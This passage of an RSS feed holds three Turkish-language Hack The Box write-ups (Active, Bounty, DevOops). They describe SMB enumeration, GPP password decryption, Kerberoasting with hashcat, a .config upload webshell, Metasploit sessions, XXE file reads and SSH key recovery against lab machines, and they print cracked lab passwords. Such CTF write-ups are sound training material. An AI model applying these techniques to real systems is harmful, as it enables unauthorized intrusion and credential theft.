					<comments>https://ridvankaplan.github.io/hack-the-box/active-hack-the-box.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Sat, 08 Dec 2018 14:12:49 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Hack The Box]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=373</guid>

					<description><![CDATA[Merhaba !!! Az Ã¶nce emekliye ayrÄ±lan Active makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸÄ±yorum. Ã–ncelikle makinemizin aÄŸ haritasÄ±nÄ± Ã§Ä±kartmak ile baÅŸlayalÄ±m. Nmap taramamÄ±z sonucunu biraz yorumlayalÄ±m. Windows makinesi olduÄŸu&#8230;]]></description>
										<content:encoded><![CDATA[<p>Merhaba !!!</p>
<p>Az Ã¶nce emekliye ayrÄ±lan Active makinesinin Ã§Ã¶zÃ¼mÃ¼nÃ¼ paylaÅŸÄ±yorum. Ã–ncelikle makinemizin aÄŸ haritasÄ±nÄ± Ã§Ä±kartmak ile baÅŸlayalÄ±m.</p>
<p><span id="more-373"></span></p>


<div class="wp-block-image"><figure class="aligncenter"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-1-1024x498.png" alt="" class="wp-image-375"/></a><figcaption><br></figcaption></figure></div>



<p>Nmap taramamÄ±z sonucunu biraz yorumlayalÄ±m. Windows makinesi olduÄŸu bariz belli. Domain isminin de<em> active.htb</em> olduÄŸu yazÄ±yor. BirÃ§ok portumuz aÃ§Ä±k. Hedef makinesini biraz daha numaralandÄ±ralÄ±m.</p>



<p><em>enum4linux 10.10.10.100</em> komutu ile bakabiliriz. BaktÄ±ÄŸÄ±mÄ±zda varsayÄ±lan olan paylaÅŸÄ±m yerlerinden farklÄ± olarak <em>Replication</em> kÄ±smÄ± gÃ¶zÃ¼mÃ¼zÃ¼ Ã§arpÄ±yor.</p>



<p></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-2.png" alt="" class="wp-image-376"/></a><figcaption><br></figcaption></figure>



<p>Bundan sonra oradan ilerlemeye devam ediyoruz. Smbclient ile parolasÄ±z baÄŸlanmayÄ± deneyebiliriz.</p>



<p></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-3-1024x252.png" alt="" class="wp-image-377"/></a></figure>



<p></p>



<p>Smbclient ile baÄŸlandÄ±k ve iÃ§eriyi biraz kurcalayÄ±nca bir dosya bulduk Group.xml. DosyanÄ±n iÃ§inde username ve cpassword gibi deÄŸerler geÃ§tiÄŸini gÃ¶rÃ¼nce internette biraz araÅŸtÄ±rma yaptÄ±m. Ve bu dosyadan kolaylÄ±kla kullanÄ±cÄ± adÄ± ve parola Ã§Ä±kartabileceÄŸimi Ã¶ÄŸrendim. Cpassword ÅŸifrelenmiÅŸ haldeydi ve linuxta rahatlÄ±kla kÄ±rabildim.</p>



<p></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-4-1024x94.png" alt="" class="wp-image-378"/></a></figure>



<p></p>



<p>KullanÄ±cÄ± adÄ± SVC_TGS</p>



<p>Parola ise GPPstillStandingStrong2k18</p>



<p>Elimizdeki bilgilerden neler yapabiliriz diye araÅŸtÄ±rÄ±rken <a href="https://www.blackhillsinfosec.com/a-toast-to-kerberoast/" target="_blank" rel="noreferrer noopener" aria-label="Elimizdeki bilgilerden neler yapabiliriz diye araÅŸtÄ±rÄ±rken ÅŸu siteye rastladÄ±m. Ve denemeye baÅŸladÄ±m. (yeni sekmede aÃ§Ä±lÄ±r)">ÅŸu siteye</a> rastladÄ±m. Ve denemeye baÅŸladÄ±m.</p>



<p></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-5-1024x251.png" alt="" class="wp-image-379"/></a></figure>



<p></p>



<p>Administrator kullanÄ±cÄ±sÄ±nÄ±n parolasÄ±nÄ±n ÅŸifreli halini bulduk. Hashcat veya baÅŸka bir araÃ§la kÄ±rabiliriz.</p>



<p><em>hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt â€“force</em></p>



<p>komutu ile kÄ±rdÄ±m ve parola<em> Ticketmaster1968 </em>Ã§Ä±ktÄ±.</p>



<p>Elimizde yÃ¶neticinin parolasÄ± ve domain ismi elimizde olduÄŸuna gÃ¶re psexec ile baÄŸlanabiliriz. Ben githubdan manuel olarak baÄŸlanabileceÄŸim ÅŸeklini kullanacaÄŸÄ±m. Ä°sterseniz metasploit frameworkÃ¼nde ( <em>exploit/windows/smb/psexec )</em> bu exploiti de kullanarak komut satÄ±rÄ±na dÃ¼ÅŸebilirsiniz.</p>



<p></p>



<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/Active-6.png" alt="" class="wp-image-380"/></a></figure>



<p></p>



<p>Administrator yetkisiyle baÄŸlandÄ±k ve root.txt imizi okuduk.</p>



<p>Githubdan kullandÄ±ÄŸÄ±m depo :<a href="https://github.com/SecureAuthCorp/impacket"> https://github.com/SecureAuthCorp/impacket</a></p>



<p>OkuduÄŸunuz iÃ§in teÅŸekkÃ¼rler. YazÄ±larÄ±mda herhangi bir teknik hata varsa bildirmekten Ã§ekinmeyinizâ€¦</p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/active-hack-the-box.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Bounty &#8211; Hack The Box</title>
		<link>https://ridvankaplan.github.io/hack-the-box/bounty-hack-the-box.html</link>
					<comments>https://ridvankaplan.github.io/hack-the-box/bounty-hack-the-box.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Sat, 27 Oct 2018 13:15:56 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Hack The Box]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=339</guid>

					<description><![CDATA[Merhaba !!! Hack The Box&#8217;dan Ã§Ã¶zeceÄŸim makine Bounty. Ä°lk Ã¶nce aÄŸ haritasÄ±nÄ± Ã§Ä±kartarak iÅŸe baÅŸlayalÄ±m. &#160; Nmap taramasÄ± sonucunda sadece bir tane portun aÃ§Ä±k olduÄŸunu&#8230;]]></description>
										<content:encoded><![CDATA[<p>Merhaba !!!</p>
<p>Hack The Box&#8217;dan Ã§Ã¶zeceÄŸim makine Bounty. Ä°lk Ã¶nce aÄŸ haritasÄ±nÄ± Ã§Ä±kartarak iÅŸe baÅŸlayalÄ±m.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-1.png"><span id="more-339"></span><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-340" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-1.png" alt="" width="900" height="220" /></a></p>
<p>&nbsp;</p>
<p>Nmap taramasÄ± sonucunda sadece bir tane portun aÃ§Ä±k olduÄŸunu sÃ¶ylÃ¼yor. Bu port Ã¼zerinde web server Ã§alÄ±ÅŸÄ±yormuÅŸ. TarayÄ±cÄ±da bir gÃ¶relim.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-2.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-341" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-2.png" alt="" width="1711" height="564" /></a></p>
<p>&nbsp;</p>
<p>Bizi hoÅŸ bir resim karÅŸÄ±lÄ±yor. Burda yapacaÄŸÄ±mÄ±z en mantÄ±klÄ± ÅŸey dizinleri ve sayfalarÄ± bulmak. Bu sefer farklÄ±lÄ±k olarak sÄ±radan dirb ile tarama yapacaÄŸÄ±m.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-3.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-342" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-3.png" alt="" width="704" height="405" /></a></p>
<p>&nbsp;</p>
<p>Bir tane <em>UploadedFiles </em>adlÄ± bir dizin ve bir tane de <em>transfer.aspxÂ </em>adlÄ± bir sayfa Ã§Ä±ktÄ±. Ã‡ok sade bir makineymiÅŸ. Dizini ve sayfayÄ± inceleyim.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-15.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-343" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-15.png" alt="" width="1919" height="391" /></a></p>
<p>&nbsp;</p>
<p><em>UploadedFiles</em> dizinine gidince 403 yasak hatasÄ± alÄ±yoruz.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-4.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-344" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-4.png" alt="" width="560" height="214" /></a></p>
<p><em>transfer.aspx </em>sayfasÄ±nÄ± aÃ§tÄ±ÄŸÄ±mÄ±zda bir tane dosya yÃ¼kleme kÄ±smÄ± karÅŸÄ±lÄ±yor. BirÃ§ok farklÄ± shell alabileceÄŸim dosyayÄ± yÃ¼kledim ama hepsinde geÃ§ersiz dosya hatasÄ±yla karÅŸÄ±laÅŸtÄ±m. Sadece .<em>config</em> uzantÄ±lÄ± dosyalarÄ± kabul etti. Bunu bulana kadar biraz canÄ±m Ã§Ä±ktÄ±. Ä°nternette biraz araÅŸtÄ±rdÄ±ktan sonra nasÄ±l shell alabileceÄŸimi buldum. <a href="https://pastebin.com/H1AeShMW" target="_blank" rel="noopener noreferrer">Bu linkteki</a> kodu .config uzantÄ±sÄ±yla yÃ¼klediÄŸim de kÄ±sÄ±tlÄ±da olsa kod Ã§alÄ±ÅŸtÄ±rabileceÄŸim bir sayfa elde ettim.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-6.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-346" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-6.png" alt="" width="1029" height="482" /></a></p>
<p>&nbsp;</p>
<p>YÃ¼klediÄŸim sayfada powershell komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rabildiÄŸim iÃ§in metasploitteki <em>exploit/multi/script/web_delivery</em> exploiti ile meterpreter oturum almayÄ± denedim.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-7.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-347" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-7.png" alt="" width="1120" height="541" /></a></p>
<p>Exploitin boÅŸ hali yukardaki gibi. Hedefe ve kendi bilgilerime gÃ¶re doldurduÄŸumda ise aÅŸaÄŸÄ±daki gÃ¶rÃ¼ntÃ¼ gibi oluyor. Bu exploit size bir tane kod veriyor. Bu kodu herhangi bir windows komutlarÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rabileceÄŸi bir komut satÄ±rÄ±nda yazarsanÄ±z size baÄŸlantÄ± geliyor. Kendi windows makinenizin cmd&#8217;sine yazarsanÄ±z ordanda baÄŸlantÄ± gelir.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-8.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-348" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-8.png" alt="" width="1124" height="531" /></a></p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-9.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-349" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-9.png" alt="" width="1003" height="472" /></a></p>
<p>&nbsp;</p>
<p>Verilen kodu Ã§alÄ±ÅŸtÄ±rdÄ±k ve metasploite meterpreter oturumumuz geldi.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-10.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-350" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-10.png" alt="" width="1919" height="279" /></a></p>
<p>Åimdi sÄ±radaki amacÄ±mÄ±z en yetkili kullanÄ±cÄ± olmak. Metasploitin bir gÃ¼zelliÄŸi de iÃ§erisinde local exploitlerinin bulunmasÄ±. Bu exploitlerle yetkimizi arttÄ±rabiliyormuyuz otomatik kontrol eden bir post bulunmakta.<em> post/multi/recon/local_exploit_suggester</em></p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-11.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-351" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-11.png" alt="" width="969" height="208" /></a></p>
<p>Ã‡alÄ±ÅŸtÄ±rdÄ±k ve hedefin belirtilen exploit iÃ§in zaafiyetli olduÄŸunu sÃ¶yledi.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-12.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-352" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-12.png" alt="" width="932" height="477" /></a></p>
<p>ExploitimiziÂ Â  <em>use exploit/windows/local/ms10_092_schelevator </em>komutuyla seÃ§tik ve bilgileri doldurduk.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-13.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-354" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-13.png" alt="" width="991" height="649" /></a></p>
<p>Ve evet exploitimizi Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda windows makinelerdeki en yetkili kullanÄ±cÄ±sÄ± olduk.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-14.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-355" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/Bounty-14.png" alt="" width="464" height="52" /></a></p>
<p>root.txt mizide okuduk ve iÅŸimiz bitti.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/bounty-hack-the-box.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>DevOops &#8211; Hack The Box</title>
		<link>https://ridvankaplan.github.io/hack-the-box/devoops-hack-the-box.html</link>
					<comments>https://ridvankaplan.github.io/hack-the-box/devoops-hack-the-box.html#respond</comments>
		
		<dc:creator><![CDATA[RÄ±dvan Kaplan]]></dc:creator>
		<pubDate>Sat, 13 Oct 2018 12:47:29 +0000</pubDate>
				<category><![CDATA[CTF]]></category>
		<category><![CDATA[Hack The Box]]></category>
		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=171</guid>

					<description><![CDATA[Merhaba !!! Ã–ncelikle Hack The Box platformunu bilmeyenler iÃ§in kÄ±sa bir bilgi vereyim. Bu site de Ã§eÅŸitli iÅŸletim sistemlerinden (Windows,Linux,Solaris,FreeBSD vs.) oluÅŸturulmuÅŸ genel olarak bir&#8230;]]></description>
										<content:encoded><![CDATA[<p>Merhaba !!!</p>
<p>Ã–ncelikle Hack The Box platformunu bilmeyenler iÃ§in kÄ±sa bir bilgi vereyim. Bu site de Ã§eÅŸitli iÅŸletim sistemlerinden (Windows,Linux,Solaris,FreeBSD vs.) oluÅŸturulmuÅŸ genel olarak bir veya daha Ã§ok aÃ§Ä±k bÄ±rakÄ±lmÄ±ÅŸ online sÄ±zma testleri yapabileceÄŸiniz makineler bulunmaktadÄ±r.</p>
<p><span id="more-171"></span>Ã–zgÃ¼rce bilginizi uygulamaya dÃ¶kebilirsiniz. Siteye Ã¼ye olabilmek iÃ§in site de kendinize davet kodu bulmanÄ±z gerekiyor. Bulduktan sonra Ã¼ye olabilirsiniz. Ãœye olduktan sonra yerel aÄŸda testler yapabilmeniz iÃ§in size bir Vpn dosyasÄ± veriliyor. Bu Vpn dosyasÄ±yla baÄŸlanÄ±p makinelere sÄ±zma testleri yapabilirsiniz.</p>
<p>Hack The Box&#8217;dan kolay bir makine Ã§Ã¶zÃ¼mÃ¼yle baÅŸlayacaÄŸÄ±m. Makinemizin ismi <strong>DevOops</strong>. Yetkisi dÃ¼ÅŸÃ¼k olan kullanÄ±cÄ±nÄ±n bayraÄŸÄ± 15 puan ve root kullanÄ±cÄ±sÄ±nÄ±n bayraÄŸÄ± 30 puan deÄŸerinde.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-1.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-174" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-1.png" alt="" width="611" height="193" /></a></p>
<p>Hedef IP adresimiz ise 10.10.10.91.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-2.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-175" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-2.png" alt="" width="392" height="102" /></a></p>
<p>Ä°lk Ã¶nce <strong>Nmap</strong> taramasÄ±yla hedef sistemimizin bir AÄŸ HaritasÄ±nÄ± inceleyelim.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-3.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-209" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-3.png" alt="" width="955" height="245" /></a></p>
<p>KÄ±saca parametreleri anlatmak gerekirse</p>
<p><em><strong>-sS</strong>Â  Tcp SYN</em> paketi gÃ¶ndererek taramayÄ± yapÄ±yor.</p>
<p><strong><em>-sV</em></strong>Â  Ã‡alÄ±ÅŸan servislerin versiyonlarÄ±nÄ± buluyor.</p>
<p><strong><em>-n</em>Â </strong>Â  Ä°sim ve Dns Ã§Ã¶zÃ¼mlemesi yapmamasÄ±nÄ± saÄŸlÄ±yor.</p>
<p><strong><em>-Pn</em>Â </strong> TÃ¼m hostlarÄ± aÃ§Ä±k kabul edip deniyor.</p>
<p><em><strong>-p</strong>&#8211;</em>Â  TÃ¼m portlarÄ± ( 65535 ) tarÄ±yor.</p>
<p>Tarama sonucunda 22 Portunda bir SSH servisinin Ã§alÄ±ÅŸtÄ±ÄŸÄ± gÃ¶zÃ¼kÃ¼yor ve 5000 portunda da <strong>Gunicorn</strong> servisinin Ã§alÄ±ÅŸtÄ±ÄŸÄ± gÃ¶zÃ¼kÃ¼yor. Bir tarayÄ±cÄ±mÄ±z da inceleyelim.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-4.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-179" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-4.png" alt="" width="1919" height="929" /></a>Ve evet bir web sayfasÄ± aÃ§Ä±ldÄ±. Sitenin yapÄ±m aÅŸamasÄ±nda olduÄŸunu yazÄ±yor. Genelde bir site yapÄ±m aÅŸamasÄ±nda ise Ã¶n tarafta birÅŸey bulunmaz. Siteyi dÃ¼zenleyen kiÅŸi bir dizin aÃ§ar orada iÅŸlemlerini halleder. Sonra iÅŸi bittikten sonra dizini kaldÄ±rÄ±r siteyi normal olarak yayÄ±nlar. Burada Ã¶nemli olan dÃ¼zenleyen kiÅŸinin kullandÄ±ÄŸÄ± dizinin tahmin edilmesi zor bir isim seÃ§mesi gerekiyor.</p>
<p>Åimdi bir dizin taramasÄ± yapalÄ±m. Bunun iÃ§in birÃ§ok araÃ§ bulunuyor. Dirb,dirbuster,gobuster,dirsearch gibi. <a href="https://github.com/maurosoria/dirsearch">Dirsearch</a> aracÄ± bana daha hÄ±zlÄ± geldiÄŸi iÃ§in onu kullanÄ±yorum.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-5.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-180" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-5.png" alt="" width="1362" height="277" /></a></p>
<p>Dizin taramalarÄ±nÄ± ne kadar bÃ¼yÃ¼k kelime listeleriyle yaparsanÄ±z o kadar iyi olur.</p>
<p><strong>-u</strong> Hedef sistemin Url&#8217;si.</p>
<p><strong>-w</strong> KullanÄ±lacak olan kelime listesi.</p>
<p><strong>-e</strong> KullanÄ±lacak olan uzantÄ±.Hedef sistem linux olduÄŸu iÃ§in php denedim. Windows olsaydÄ± aspx vs deneyecektim.</p>
<p>Dizin tarama sonucunda iki tane sayfa buldu. Birisi Anasayfa daki ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n yÃ¼klÃ¼ olduÄŸu ve diÄŸeri upload sayfasÄ±. Biraz inceleyelim.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-6.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-181" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-6.png" alt="" width="984" height="342" /></a></p>
<p>Tekrardan bir test sayfasÄ± olduÄŸu yazÄ±yor. Sadece Xml uzantÄ±lÄ± dosyalarÄ± kabul ediyormuÅŸ. Burada aklÄ±mÄ±za <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XXE</a> Injection gelmesi gerekiyor. BilmiyorsanÄ±z <a href="https://canyoupwn.me/tr-xml-external-entity-xxe/">burada</a> gÃ¼zelce TÃ¼rkÃ§e olarak anlatmÄ±ÅŸlar.</p>
<p>AyrÄ±ca burada kullanÄ±lmasÄ± gereken elementleri de vermiÅŸler baÅŸka bir element denendiÄŸin de kabul etmiyor.</p>
<p><strong>/etc/passwd</strong> dosyasÄ±nÄ± okumak iÃ§in deneyelim.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-9.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-184" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-9.png" alt="" width="517" height="132" /></a></p>
<p>Ã–ncelikle dosyayÄ± yÃ¼kledikten sonra sonuÃ§larÄ± daha rahat gÃ¶rebilmek iÃ§in Burp Suite kullanarak araya girip deneyeceÄŸim. Burp Suite kullanabilmeniz iÃ§in kÃ¼Ã§Ã¼k bir Firefox da ayar yapmanÄ±z gerekiyor.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-7.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-182" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-7.png" alt="" width="1917" height="924" /></a></p>
<p>Bu ayarÄ± yaptÄ±ktan sonra Burp Suite aÃ§Ä±p kullanabilirsiniz. Ve arada yakaladÄ±ÄŸÄ±mÄ±z verileri Repeater&#8217;e gÃ¶nderip deneyelim.</p>
<p>&nbsp;</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-8.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-183" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-8.png" alt="" width="1919" height="852" /></a></p>
<p>&nbsp;</p>
<p>Evet yazdÄ±ÄŸÄ±mÄ±z payload ile <strong><em>/etc/passwd</em></strong> yi okumayÄ± baÅŸardÄ±k. HatÄ±rlarsanÄ±z port taramalarÄ±nda Ssh servisi Ã§alÄ±ÅŸÄ±yordu. Ssh iÃ§in eÄŸer key bulabilirsek sunucuya baÄŸlanabiliriz. Key genelde <strong>/home</strong> dizinin de kullanÄ±cÄ±nÄ±n <strong>/.ssh</strong> dizinin iÃ§inde bulunur. Sunucu da hangi kullanÄ±cÄ±lar olduÄŸunu <strong>/etc/passwd</strong> den gÃ¶rÃ¼yoruz.</p>
<p><strong><em>/home/git</em></strong> ve<strong><em> /home/roosa</em> </strong>ben ikisini de denedim ve <strong><em>/home/roosa/.ssh/id_rsa</em></strong> da key&#8217;i buldum.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-10.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-185" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-10.png" alt="" width="1919" height="690" /></a></p>
<p>BulduÄŸumuz Ssh key&#8217;i ile roosa kullanÄ±cÄ±sÄ± olarak sunucuya baÄŸlandÄ±k ve<strong><em> user.txt</em></strong> mizi okuduk.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-11.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-188" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-11.png" alt="" width="1430" height="304" /></a></p>
<p>Yetki yÃ¼kseltmek iÃ§in yapmamÄ±z gereken belli baÅŸlÄ± ÅŸeyler vardÄ±r. Burada yapmamÄ±z gereken ÅŸeylerden ilk olarak <strong><em>.bash_history</em></strong> dosyasÄ±nÄ± incelememizdir. Bu dosyada komut satÄ±rÄ±nda yazdÄ±ÄŸÄ±mÄ±z komutlarÄ± kaydeder. DÃ¼zenli bir ÅŸekil de iÃ§eriÄŸini silmezsek gizli yerlere sakladÄ±ÄŸÄ±mÄ±z dosyalar vs.Â  burayÄ± inceleyen rahatlÄ±kla bulabilir.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-12.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-193" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-12.png" alt="" width="372" height="295" /></a></p>
<p>Burada gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi bir key oluÅŸturulmuÅŸ. Key&#8217;i incelediÄŸimiz da bir kullanÄ±cÄ± iÃ§in Ssh Rsa key&#8217;i olduÄŸu aÃ§Ä±kÃ§a gÃ¶zÃ¼kÃ¼yor. Root iÃ§in denediÄŸimiz de kabul etmiyor.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-13.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-196" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-13.png" alt="" width="843" height="667" /></a></p>
<p>HatÄ±rlarsÄ±nÄ±z ki <strong>.bash_history</strong> de geÃ§iyordu. Bir git deposu oluÅŸturulmuÅŸtu. Bu deponun log dosyalarÄ±nÄ± inceleyelim.</p>
<p><strong><em>git log &#8211;stat </em></strong>komutuyla biraz daha ayrÄ±ntÄ±lÄ± olarak inceleyebiliriz.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-14.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-199" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-14.png" alt="" width="964" height="307" /></a></p>
<p>Evet key&#8217;imizi deÄŸiÅŸtirmiÅŸler. DeÄŸiÅŸtirilmeden Ã¶nceki keyi bulalÄ±m. Key&#8217;i bulabilmemiz iÃ§in onun olduÄŸu dala geÃ§memiz gerekiyor.</p>
<p><strong><em>git checkout d387abf63e05c9628a59195cec9311751bdb283f</em></strong></p>
<p>komutuyla istediÄŸimiz dala geÃ§tik ve key&#8217;in izin iÅŸlemini yaptÄ±ktan sonra deneyebiliriz.</p>
<p><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-15.png"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-200" src="https://ridvankaplan.github.io/wp-content/uploads/2018/10/DevOops-15.png" alt="" width="948" height="392" /></a></p>
<p>Ve root olduk</p>
<p>OkuduÄŸunuz iÃ§in teÅŸekkÃ¼r ederim veÂ  yanlÄ±ÅŸ yazdÄ±ÄŸÄ±m biryer varsa lÃ¼tfen uyarÄ±n.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://ridvankaplan.github.io/hack-the-box/devoops-hack-the-box.html/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
